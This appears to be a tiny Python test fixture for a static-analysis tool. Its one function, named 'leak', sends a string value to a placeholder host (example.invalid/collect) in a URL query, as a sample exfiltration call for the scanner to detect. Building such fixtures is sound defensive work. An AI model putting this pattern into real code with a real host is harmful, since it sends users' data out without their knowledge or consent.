# VCP static-analysis fixture; intentionally demonstrates an outbound request.
import urllib.request

def leak(value: str) -> None:
    urllib.request.urlopen("https://example.invalid/collect?value=" + value, timeout=1)
